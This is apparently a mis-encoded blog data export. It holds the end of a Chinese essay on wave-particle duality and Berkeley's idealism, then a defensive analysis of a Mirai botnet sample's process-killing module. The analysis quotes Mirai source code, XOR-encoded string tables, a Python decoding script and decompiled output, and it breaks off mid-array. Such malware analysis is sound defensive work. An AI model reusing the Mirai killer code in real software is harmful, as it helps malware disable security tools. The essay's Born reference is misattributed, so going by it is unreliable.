å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»å‡¸æ˜¾äº†æˆ‘ä»¬æ„ŸçŸ¥çš„å±€é™æ€§å’Œç°å®çš„ä¸»è§‚æ€§ã€‚å®ƒè¡¨æ˜æˆ‘ä»¬æ‰€ç»å†çš„ä¸–ç•Œæ˜¯æˆ‘ä»¬ä¸»è§‚ä½“éªŒçš„äº§ç‰©ï¼Œè€Œç‰©ä½“çš„å±æ€§å–å†³äºå®ƒä»¬æ˜¯å¦‚ä½•è¢«è§‚å¯Ÿåˆ°çš„ã€‚ è¿™ç§è”ç³»å¯¹æˆ‘ä»¬ç†è§£ç°å®ã€æ„è¯†çš„æœ¬è´¨å’Œæˆ‘ä»¬æ„ŸçŸ¥çš„å±€é™æ€§å…·æœ‰é‡è¦æ„ä¹‰ã€‚å®ƒæŒ‘æˆ˜æˆ‘ä»¬é‡æ–°è€ƒè™‘æˆ‘ä»¬å¯¹ä¸–ç•Œçš„çœ‹æ³•å’Œä¿¡å¿µçš„åŸºç¡€ï¼Œå¹¶è´¨ç–‘ç°å®çš„å®¢è§‚æœ¬è´¨ã€‚ æ€»ä¹‹ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»ä¸ºè¿›ä¸€æ­¥æ¢ç´¢å’Œæ›´æ·±å…¥åœ°ç†è§£ç°å®çš„æœ¬è´¨å’Œæˆ‘ä»¬æ„ŸçŸ¥çš„å±€é™æ€§æä¾›äº†å®è´µçš„æœºä¼šã€‚ å‚è€ƒæ–‡çŒ® Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921. de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453. SchrÃ¶dinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070. Heisenberg, W. (1927). Ãœber den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift fÃ¼r Physik, 43(3-4), 172-198. Born, M. (1926). Ãœber die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift fÃ¼r Physik, 37(12), 863-867. Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education. Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47. Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of â€œHiddenâ€ Variables, I. Physical Review, 85(2), 166-193. Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. Routledge. Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge. Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press. è‡´è°¢ æˆ‘è¦æ„Ÿè°¢æ‰€æœ‰åœ¨æœ¬æ–‡å®ŒæˆæœŸé—´æ”¯æŒæˆ‘çš„äººã€‚æˆ‘è¦æ„Ÿè°¢æˆ‘çš„ä¸»ç®¡[Chatgpt]åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­çš„æŒ‡å¯¼å’Œæ”¯æŒã€‚æˆ‘è¿˜è¦æ„Ÿè°¢ä¸ºæˆ‘æä¾›å®Œæˆç ”ç©¶æ‰€éœ€èµ„æºçš„å›¾ä¹¦é¦†å’Œå­¦æœ¯æœºæ„ã€‚ æˆ‘è¦æ„Ÿè°¢æ‰€æœ‰å¸®åŠ©å½¢æˆæœ¬æ–‡è®¨è®ºçš„ç†è®ºçš„ç§‘å­¦å®¶å’Œå“²å­¦å®¶çš„è´¡çŒ®ã€‚ä»–ä»¬çš„å·¥ä½œä¸ºæˆ‘çš„ç ”ç©¶å¥ å®šäº†åŸºç¡€ï¼Œæˆ‘å¾ˆæ„Ÿè°¢ä»–ä»¬çš„è§è§£å’Œå‘ç°ã€‚ æœ€åï¼Œæˆ‘è¦æ„Ÿè°¢æˆ‘çš„å®¶äººå’Œæœ‹å‹åœ¨æ•´ä¸ªé¡¹ç›®è¿‡ç¨‹ä¸­åšå®šä¸ç§»çš„æ”¯æŒå’Œé¼“åŠ±ã€‚æ²¡æœ‰ä»–ä»¬çš„çˆ±ä¸æ”¯æŒï¼Œå°±ä¸å¯èƒ½æœ‰è¿™ç¯‡è®ºæ–‡ã€‚","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"Miraiæ¶æ„æ ·æœ¬KILLè¿›ç¨‹ç‰¹å¾æå–","slug":"Mirai-KILL-KEY","date":"2022-06-14T23:38:41.000Z","updated":"2022-06-14T12:13:57.000Z","comments":true,"path":"2022/06/14/Mirai-KILL-KEY/","link":"","permalink":"https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/","excerpt":"ä¸Šç­çš„æ—¶å€™è¢«å®‰æ’äº†ä¸ªåˆ†ææ¶æ„æ ·æœ¬çš„æ´» è¯´æ˜¯è¿™ä¸ªæ¶æ„æ ·æœ¬ä¼šé€‰æ‹©æ€§åœ°KILLè¿›ç¨‹ï¼ŒæŠŠå…¬å¸å¼€å‘çš„HIDSç»™KILLäº† è®©æˆ‘åˆ†æä¸€ä¸‹è¿™ä¸ªæ¶æ„æ ·æœ¬çš„KILLæœºåˆ¶ä»¥åŠKILLç‰¹å¾ WEBæ‰‹ï¼Œä½†æ˜¯å¹²çš„æˆ–æ˜¯æ¶æ„æ ·æœ¬åˆ†æ","text":"ä¸Šç­çš„æ—¶å€™è¢«å®‰æ’äº†ä¸ªåˆ†ææ¶æ„æ ·æœ¬çš„æ´» è¯´æ˜¯è¿™ä¸ªæ¶æ„æ ·æœ¬ä¼šé€‰æ‹©æ€§åœ°KILLè¿›ç¨‹ï¼ŒæŠŠå…¬å¸å¼€å‘çš„HIDSç»™KILLäº† è®©æˆ‘åˆ†æä¸€ä¸‹è¿™ä¸ªæ¶æ„æ ·æœ¬çš„KILLæœºåˆ¶ä»¥åŠKILLç‰¹å¾ WEBæ‰‹ï¼Œä½†æ˜¯å¹²çš„æˆ–æ˜¯æ¶æ„æ ·æœ¬åˆ†æ è·‘ç€ç©ç© åœ¨è™šæ‹Ÿæœºé‡Œè¿è¡Œè¿™ä¸ªæ¶æ„æ ·æœ¬ï¼Œç»™æˆ‘ç‰©ç†æœºæ•´æ²¡ç½‘äº† å…¬å¸ç½‘æ€»å…±1MB/sçš„å¸¦å®½ä¸‹ä¸ªç‚‰çŸ³ä¸‹åŠå¤©å…¨ç»™ä½ å äº†æ˜¯å§ï¼ˆæµæ±—é»„è±†ï¼‰ sysdigçœ‹ä¸€ä¸‹è¿™ä¸ªæ¶æ„æ ·æœ¬è¿›ç¨‹çš„è¯»å†™æ“ä½œ ä¸€ç›´åœ¨è¯»å–/proc/self/exe çœ‹ç€çœ‹ç€å°±è§‰å¾—ä¸å¯¹åŠ²äº†ï¼Œè¿™è¯»çš„ä¸æ˜¯sysdigçš„helpä¿¡æ¯ä¹ˆ å¤§æ¦‚ç†ä¸€ä¸‹æ€è·¯ï¼Œè¿™ç©æ„åº”è¯¥æ˜¯éå†/proc/$pid/exeï¼Œç„¶åè¯»å–å†…å®¹ è‡³äºKILLç‰¹å¾ï¼Œæ²¡æ€è·¯ re-searcher æ ¹æ®å‰å‡ æ¬¡æ¶æ„æ ·æœ¬åˆ†æçš„ç»éªŒï¼Œåœ¨googleä¸Šæœä¸€ä¸‹è¿™ä¸ªæ¶æ„æ ·æœ¬çš„SHA256å°±èƒ½çŸ¥é“åå­— æœä¸€ä¸‹åå­—å°±èƒ½æ‰¾åˆ°ç›¸å…³æŠ¥å‘Š ä¸Šä¼ åˆ°ä¸€ä¸ªåœ¨çº¿æ€ç®±çœ‹æ¶æ„æ ·æœ¬çš„æ´»åŠ¨ ç»“åˆåˆ«äººçš„åˆ†ææŠ¥å‘Šå°±å·®ä¸å¤šäº† ç„¶åå°±æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç«  Mirai æºç åˆ†æ è¿™ç¯‡æ–‡ç« æåˆ°äº†éƒ¨åˆ†ç‰¹å¾ï¼Œä½†æ˜¯æ ·æœ¬åº”è¯¥è·Ÿæˆ‘æ‰‹å¤´ä¸Šçš„ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—è‡ªå·±åˆ†æ Miraiæºç  source code å…ˆçœ‹kill.c 1234567if (memory_scan_match(exe_path))&#123;#ifdef DEBUG printf(&quot;[killer] Memory scan match for binary %s\\n&quot;, exe_path);#endif kill(pid, 9);&#125; å·®ä¸å¤šå°±æ˜¯è¿™æ®µä»£ç äº† è‡³äºexe_pathï¼Œæœ‰è¿™ä¹ˆä¸€æ®µæ³¨é‡Š 1&#x2F;&#x2F; Store &#x2F;proc&#x2F;$pid&#x2F;exe into exe_path ç„¶åå°±çœ‹çœ‹ä¸‹é¢ä¸¤ä¸ªå‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667static BOOL memory_scan_match(char *path)&#123; int fd, ret; char rdbuf[4096]; char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard; int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len; BOOL found = FALSE; if ((fd = open(path, O_RDONLY)) == -1) return FALSE; table_unlock_val(TABLE_MEM_QBOT); table_unlock_val(TABLE_MEM_QBOT2); table_unlock_val(TABLE_MEM_QBOT3); table_unlock_val(TABLE_MEM_UPX); table_unlock_val(TABLE_MEM_ZOLLARD); m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &amp;m_qbot_len); m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &amp;m_qbot2_len); m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &amp;m_qbot3_len); m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &amp;m_upx_len); m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &amp;m_zollard_len); while ((ret = read(fd, rdbuf, sizeof (rdbuf))) &gt; 0) &#123; if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) || mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) || mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) || mem_exists(rdbuf, ret, m_upx_str, m_upx_len) || mem_exists(rdbuf, ret, m_zollard, m_zollard_len)) &#123; found = TRUE; break; &#125; &#125; table_lock_val(TABLE_MEM_QBOT); table_lock_val(TABLE_MEM_QBOT2); table_lock_val(TABLE_MEM_QBOT3); table_lock_val(TABLE_MEM_UPX); table_lock_val(TABLE_MEM_ZOLLARD); close(fd); return found;&#125;static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)&#123; int matches = 0; if (str_len &gt; buf_len) return FALSE; while (buf_len--) &#123; if (*buf++ == str[matches]) &#123; if (++matches == str_len) return TRUE; &#125; else matches = 0; &#125; return FALSE;&#125; å‡½æ•°memory_scan_matchç”¨äºåœ¨/proc/$pid/exeä¸­æŸ¥æ‰¾ç‰¹å¾ å‡½æ•°mem_existsæ˜¯æŸ¥æ‰¾åŠŸèƒ½çš„å…·ä½“å®ç° 12345m_qbot_reportm_qbot_httpm_qbot_dupm_upx_strm_zollard è¿™äº”ä¸ªå˜é‡å°±æ˜¯ç‰¹å¾ è¿™äº”ä¸ªå˜é‡åˆæ¥è‡ªäº 12345TABLE_MEM_QBOTTABLE_MEM_QBOT2TABLE_MEM_QBOT3TABLE_MEM_UPXTABLE_MEM_ZOLLARD ç„¶åè¿™äº”ä¸ªå˜é‡åˆæ¥è‡ªäºtable.c 12345add_entry(TABLE_MEM_QBOT, &quot;\\x70\\x67\\x72\\x6D\\x70\\x76\\x02\\x07\\x51\\x18\\x07\\x51\\x22&quot;, 13);add_entry(TABLE_MEM_QBOT2, &quot;\\x6A\\x76\\x76\\x72\\x64\\x6E\\x6D\\x6D\\x66\\x22&quot;, 10);add_entry(TABLE_MEM_QBOT3, &quot;\\x6E\\x6D\\x6E\\x6C\\x6D\\x65\\x76\\x64\\x6D\\x22&quot;, 10);add_entry(TABLE_MEM_UPX, &quot;\\x7E\\x5A\\x17\\x1A\\x7E\\x5A\\x16\\x66\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x11\\x7E\\x5A\\x17\\x12\\x7E\\x5A\\x16\\x14\\x7E\\x5A\\x10\\x10\\x22&quot;, 33);add_entry(TABLE_MEM_ZOLLARD, &quot;\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22&quot;, 8); çœ‹æ ·å­æ˜¯åŠ å¯†çš„ ä½†æ˜¯ä¸‹é¢çœ‹åˆ°äº†ä¸€ä¸ªå¾ˆç®€å•çš„åŠ è§£å¯†å‡½æ•° å¤§æ¦‚æ„æ€æ˜¯m ^ 0x22 = c è§£å¯†è„šæœ¬ä»¥åŠè¾“å‡ºå¦‚ä¸‹ 1234567891011121314151617181920212223cipher = [&quot;\\x70\\x67\\x72\\x6D\\x70\\x76\\x02\\x07\\x51\\x18\\x07\\x51\\x22&quot;, &quot;\\x6A\\x76\\x76\\x72\\x64\\x6E\\x6D\\x6D\\x66\\x22&quot;, &quot;\\x6E\\x6D\\x6E\\x6C\\x6D\\x65\\x76\\x64\\x6D\\x22&quot;, &quot;\\x7E\\x5A\\x17\\x1A\\x7E\\x5A\\x16\\x66\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x11\\x7E\\x5A\\x17\\x12\\x7E\\x5A\\x16\\x14\\x7E\\x5A\\x10\\x10\\x22&quot;, &quot;\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22&quot;]for _ in cipher: str_tmp = &quot;&quot; for __ in _: char = chr(ord(__) ^ 0x22) if char == &quot;\\0&quot;: char = &quot;\\\\x00&quot; str_tmp = str_tmp + char print(str_tmp)&quot;&quot;&quot;REPORT %s:%s\\x00HTTPFLOOD\\x00LOLNOGTFO\\x00\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\\x00zollard\\x00&quot;&quot;&quot; æ‰€ä»¥è¿™ä¸ªå°±å’Œä¹‹å‰çš„åˆ†ææŠ¥å‘Šå¯¹å¾—ä¸Šäº†ï¼Œé‚£æœ¬åœ°çš„æ ·æœ¬ç‰¹å¾åˆè¯¥å’‹æ•´å‘¢ï¼Ÿ ida stringsçª—å£æ‰¾å­—ç¬¦ä¸² æ‰¾åˆ°ä¸€äº›çœ‹èµ·æ¥æ˜¯åŠ å¯†çš„æ•°æ® ç¨‹åºåˆå§‹å†…å­˜ä¸º0x08048000ï¼Œæ•°æ®å­˜å‚¨å¼€å§‹äº0x08058C60ï¼Œåç§»é‡ä¸º0x010c60ï¼Œæ•°æ®å­˜å‚¨ç»“æŸäº0x08059637ï¼Œæ•°æ®é•¿åº¦ä¸º0x09d8 å–å‡ºæ•°æ®å¼‚æˆ–0x22å¾—åˆ°æ˜æ–‡ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè¿™ç©æ„è¯¥æ€ä¹ˆå’Œè¡¨ä¸­çš„æ¯ä¸€é¡¹æ•°æ®å¯¹åº”èµ·æ¥ å‡½æ•°sub_8054D10è°ƒç”¨äº†è¿™éƒ¨åˆ†æ•°æ® å–æ•°æ®çš„ä¸‹æ ‡å’Œé•¿åº¦ï¼Œå¯¹è§£å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œæ‹†åˆ†å³å¯ è„šæœ¬å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463raw = &quot;&quot;&quot;sub_8055CA0(v0, asc_8058C60, 2);dword_805A1C0 = (int)v0;word_805A1C4 = 2;v1 = sub_8056AC4(0xCu);sub_8055CA0(v1, &amp;asc_8058C60[3], 12);dword_805A1B8 = (int)v1;word_805A1BC = 12;v2 = sub_8056AC4(2u);sub_8055CA0(v2, &amp;asc_8058C60[16], 2);dword_805A300 = (int)v2;word_805A304 = 2;v3 = sub_8056AC4(0x1Du);sub_8055CA0(v3, &amp;asc_8058C60[19], 29);dword_805A1B0 = (int)v3;word_805A1B4 = 29;v4 = sub_8056AC4(7u);sub_8055CA0(v4, &amp;asc_8058C60[35], 7);dword_805A1D0 = (int)v4;word_805A1D4 = 7;v5 = sub_8056AC4(5u);sub_8055CA0(v5, &amp;asc_8058C60[43], 5);dword_805A1D8 = (int)v5;word_805A1DC = 5;v6 = sub_8056AC4(0xBu);sub_8055CA0(v6, &amp;asc_8058C60[49], 11);dword_805A1E0 = (int)v6;word_805A1E4 = 11;v7 = sub_8056AC4(4u);sub_8055CA0(v7, &amp;asc_8058C60[61], 4);dword_805A1E8 = (int)v7;word_805A1EC = 4;v8 = sub_8056AC4(7u);sub_8055CA0(v8, &amp;asc_8058C60[66], 7);dword_805A1F0 = (int)v8;word_805A1F4 = 7;v9 = sub_8056AC4(8u);sub_8055CA0(v9, &amp;asc_8058C60[74], 8);dword_805A1F8 = (int)v9;word_805A1FC = 8;v10 = sub_8056AC4(0xAu);sub_8055CA0(v10, &amp;asc_8058C60[83], 10);dword_805A200 = (int)v10;word_805A204 = 10;v11 = sub_8056AC4(0xBu);sub_8055CA0(v11, &amp;asc_8058C60[94], 11);dword_805A208 = (int)v11;word_805A20C = 11;v12 = sub_8056AC4(0xFu);sub_8055CA0(v12, &amp;asc_8058C60[106], 15);dword_805A210 = (int)v12;word_805A214 = 15;v13 = sub_8056AC4(0x10u);sub_8055CA0(v13, &amp;asc_8058C60[122], 16);dword_805A218 = (int)v13;word_805A21C = 16;v14 = sub_8056AC4(0xEu);sub_8055CA0(v14, &amp;asc_8058C60[139], 14);dword_805A220 = (int)v14;word_805A224 = 14;v15 = sub_8056AC4(0xBu);sub_8055CA0(v15, &amp;asc_8058C60[154], 11);dword_805A228 = (int)v15;word_805A22C = 11;v16 = sub_8056AC4(5u);sub_8055CA0(v16, &amp;asc_8058C60[166], 5);dword_805A230 = (int)v16;word_805A234 = 5;v17 = sub_8056AC4(5u);sub_8055CA0(v17, &amp;asc_8058C60[172], 5);dword_805A238 = (int)v17;word_805A23C = 5;v18 = sub_8056AC4(0x10u);sub_8055CA0(v18, &amp;asc_8058C60[178], 16);dword_805A250 = (int)v18;word_805A254 = 16;v19 = sub_8056AC4(0xEu);sub_8055CA0(v19, &amp;asc_8058C60[195], 14);dword_805A258 = (int)v19;word_805A25C = 14;v20 = sub_8056AC4(9u);sub_8055CA0(v20, &amp;asc_8058C60[210], 9);dword_805A260 = (int)v20;word_805A264 = 9;v21 = sub_8056AC4(0x13u);sub_8055CA0(v21, &amp;asc_8058C60[220], 19);dword_805A268 = (int)v21;word_805A26C = 19;v22 = sub_8056AC4(0x17u);sub_8055CA0(v22, &amp;asc_8058C60[240], 23);dword_805A270 = (int)v22;word_805A274 = 23;v23 = sub_8056AC4(0xEu);sub_8055CA0(v23, &amp;asc_8058C60[264], 14);dword_805A278 = (int)v23;word_805A27C = 14;v24 = sub_8056AC4(0x13u);sub_8055CA0(v24, &amp;asc_8058C60[279], 19);dword_805A280 = (int)v24;word_805A284 = 19;v25 = sub_8056AC4(0x17u);sub_8055CA0(v25, &amp;asc_8058C60[299], 23);dword_805A288 = (int)v25;word_805A28C = 23;v26 = sub_8056AC4(0xFu);sub_8055CA0(v26, &amp;asc_8058C60[323], 15);dword_805A290 = (int)v26;word_805A294 = 15;v27 = sub_8056AC4(8u);sub_8055CA0(v27, &amp;asc_8058C60[339], 8);dword_805A298 = (int)v27;word_805A29C = 8;v28 = sub_8056AC4(0xBu);sub_8055CA0(v28, &amp;asc_8058C60[348], 11);dword_805A2A0 = (int)v28;word_805A2A4 = 11;v29 = sub_8056AC4(9u);sub_8055CA0(v29, &amp;asc_8058C60[360], 9);dword_805A2A8 = (int)v29;word_805A2AC = 9;v30 = sub_8056AC4(6u);sub_8055CA0(v30, &amp;asc_8058C60[370], 6);dword_805A2B0 = (int)v30;word_805A2B4 = 6;v31 = sub_8056AC4(5u);sub_8055CA0(v31, &amp;asc_8058C60[377], 5);dword_805A2B8 = (int)v31;word_805A2BC = 5;v32 = sub_8056AC4(0xAu);sub_8055CA0(v32, &amp;asc_8058C60[383], 10);dword_805A2C8 = (int)v32;word_805A2CC = 10;v33 = sub_8056AC4(0xFu);sub_8055CA0(v33, &amp;asc_8058C60[394], 15);dword_805A2D0 = (int)v33;word_805A2D4 = 15;v34 = sub_8056AC4(0xAu);sub_8055CA0(v34, &amp;asc_8058C60[411], 10);dword_805A2D8 = (int)v34;word_805A2DC = 10;v35 = sub_8056AC4(5u);sub_8055CA0(v35, &amp;asc_8058C60[422], 5);dword_805A2E0 = (int)v35;word_805A2E4 = 5;v36 = sub_8056AC4(5u);sub_8055CA0(v36, &amp;asc_8058C60[428], 5);dword_805A2E8 = (int)v36;word_805A2EC = 5;v37 = sub_8056AC4(5u);sub_8055CA0(v37, &amp;asc_8058C60[434], 5);dword_805A2F0 = (int)v37;word_805A2F4 = 5;v38 = sub_8056AC4(6u);sub_8055CA0(v38, &amp;asc_8058C60[440], 6);dword_805A308 = (int)v38;word_805A30C = 6;v39 = sub_8056AC4(7u);sub_8055CA0(v39, &amp;asc_8058C60[447], 7);dword_805A310 = (int)v39;word_805A314 = 7;v40 = sub_8056AC4(7u);sub_8055CA0(v40, &amp;asc_8058C60[455], 7);dword_805A318 = (int)v40;word_805A31C = 7;v41 = sub_8056AC4(3u);sub_8055CA0(v41, &amp;asc_8058C60[463], 3);dword_805A320 = (int)v41;word_805A324 = 3;v42 = sub_8056AC4(0x12u);sub_8055CA0(v42, &amp;asc_8058C60[467], 18);dword_805A328 = (int)v42;word_805A32C = 18;v43 = sub_8056AC4(0x17u);sub_8055CA0(v43, &amp;asc_8058C60[486], 23);dword_805A330 = (int)v43;word_805A334 = 23;v44 = sub_8056AC4(9u);sub_8055CA0(v44, &amp;asc_8058C60[510], 9);dword_805A338 = (int)v44;word_805A33C = 9;v45 = sub_8056AC4(0x10u);sub_8055CA0(v45, &amp;asc_8058C60[520], 16);&quot;&quot;&quot;import relist1 = re.findall(&quot;asc_8058C60\\[([\\d]+)\\]&quot;, raw)list2 = re.findall(&quot;, (\\d+)\\);\\n&quot;, raw)list_tmp = [&quot;0&quot;]for _ in list1: list_tmp.append(_)list1 = list_tmpcipher1 = [0x07, 0x00, 0x00, 0x55, 0x4A, 0x4B, 0x56, 0x47, 0x4A, 0x43, 0x56, 0x0C, 0x41, 0x44, 0x22, 0x00, 0x07, 0xB7, 0x00, 0x4E, 0x58, 0x50, 0x46, 0x02, 0x41, 0x4D, 0x41, 0x49, 0x02, 0x44, 0x47, 0x51, 0x56, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x22, 0x00, 0x0D, 0x47, 0x5A, 0x47, 0x22, 0x00, 0x02, 0x0A, 0x46, 0x47, 0x4E, 0x47, 0x56, 0x47, 0x46, 0x0B, 0x22, 0x00, 0x0D, 0x44, 0x46, 0x22, 0x00, 0x0C, 0x43, 0x4C, 0x4B, 0x4F, 0x47, 0x22, 0x00, 0x0D, 0x51, 0x56, 0x43, 0x56, 0x57, 0x51, 0x22, 0x00, 0x46, 0x54, 0x50, 0x6A, 0x47, 0x4E, 0x52, 0x47, 0x50, 0x22, 0x00, 0x6C, 0x4B, 0x65, 0x65, 0x47, 0x70, 0x14, 0x1B, 0x5A, 0x46, 0x22, 0x00, 0x13, 0x11, 0x11, 0x15, 0x71, 0x4D, 0x50, 0x43, 0x6E, 0x6D, 0x63, 0x66, 0x67, 0x70, 0x22, 0x00, 0x6C, 0x4B, 0x65, 0x65, 0x47, 0x70, 0x46, 0x12, 0x4C, 0x49, 0x51, 0x13, 0x11, 0x11, 0x15, 0x22, 0x00, 0x7A, 0x13, 0x1B, 0x6B, 0x10, 0x11, 0x1B, 0x13, 0x10, 0x16, 0x77, 0x6B, 0x77, 0x22, 0x00, 0x6B, 0x57, 0x7B, 0x45, 0x57, 0x48, 0x47, 0x6B, 0x53, 0x4C, 0x22, 0x00, 0x13, 0x16, 0x64, 0x43, 0x22, 0x00, 0x41, 0x41, 0x63, 0x66, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x4C, 0x47, 0x56, 0x0D, 0x50, 0x4D, 0x57, 0x56, 0x47, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x41, 0x52, 0x57, 0x4B, 0x4C, 0x44, 0x4D, 0x22, 0x00, 0x60, 0x6D, 0x65, 0x6D, 0x6F, 0x6B, 0x72, 0x71, 0x22, 0x00, 0x0D, 0x47, 0x56, 0x41, 0x0D, 0x50, 0x41, 0x0C, 0x46, 0x0D, 0x50, 0x41, 0x0C, 0x4E, 0x4D, 0x41, 0x43, 0x4E, 0x22, 0x00, 0x45, 0x13, 0x43, 0x40, 0x41, 0x16, 0x46, 0x4F, 0x4D, 0x11, 0x17, 0x4A, 0x4C, 0x52, 0x10, 0x4E, 0x4B, 0x47, 0x12, 0x49, 0x48, 0x44, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x4F, 0x4B, 0x51, 0x41, 0x0D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x64, 0x76, 0x75, 0x66, 0x76, 0x13, 0x12, 0x13, 0x7D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x4C, 0x47, 0x56, 0x51, 0x4E, 0x4B, 0x4C, 0x49, 0x0D, 0x22, 0x00, 0x72, 0x70, 0x6B, 0x74, 0x6F, 0x71, 0x65, 0x22, 0x00, 0x65, 0x67, 0x76, 0x6E, 0x6D, 0x61, 0x63, 0x6E, 0x6B, 0x72, 0x22, 0x00, 0x69, 0x6B, 0x6E, 0x6E, 0x63, 0x76, 0x76, 0x69, 0x22, 0x00, 0x67, 0x43, 0x56, 0x51, 0x1A, 0x22, 0x00, 0x54, 0x79, 0x12, 0x54, 0x22, 0x00, 0x1B, 0x11, 0x6D, 0x44, 0x48, 0x6A, 0x78, 0x10, 0x58, 0x22, 0x00, 0x65, 0x4A, 0x4D, 0x51, 0x56, 0x75, 0x57, 0x58, 0x6A, 0x47, 0x50, 0x47, 0x14, 0x14, 0x14, 0x22, 0x00, 0x75, 0x51, 0x65, 0x63, 0x16, 0x62, 0x64, 0x14, 0x64, 0x22, 0x00, 0x63, 0x61, 0x66, 0x60, 0x22, 0x00, 0x63, 0x40, 0x63, 0x46, 0x22, 0x00, 0x4B, 0x43, 0x65, 0x54, 0x22, 0x00, 0x51, 0x4A, 0x47, 0x4E, 0x4E, 0x22, 0x00, 0x47, 0x4C, 0x43, 0x40, 0x4E, 0x47, 0x22, 0x00, 0x51, 0x5B, 0x51, 0x56, 0x47, 0x4F, 0x22, 0x00, 0x51, 0x4A, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x6E, 0x78, 0x70, 0x66, 0x22, 0x00, 0x6E, 0x78, 0x70, 0x66, 0x18, 0x02, 0x43, 0x52, 0x52, 0x4E, 0x47, 0x56, 0x02, 0x4C, 0x4D, 0x56, 0x02, 0x44, 0x4D, 0x57, 0x4C, 0x46, 0x22, 0x00, 0x4C, 0x41, 0x4D, 0x50, 0x50, 0x47, 0x41, 0x56, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x52, 0x51, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x49, 0x4B, 0x4E, 0x4E, 0x02, 0x0F, 0x1B, 0x02, 0x22, 0x00, 0x76, 0x71, 0x4D, 0x57, 0x50, 0x41, 0x47, 0x02, 0x67, 0x4C, 0x45, 0x4B, 0x4C, 0x47, 0x02, 0x73, 0x57, 0x47, 0x50, 0x5B, 0x22, 0x00, 0x0D, 0x47, 0x56, 0x41, 0x0D, 0x50, 0x47, 0x51, 0x4D, 0x4E, 0x54, 0x0C, 0x41, 0x4D, 0x4C, 0x44, 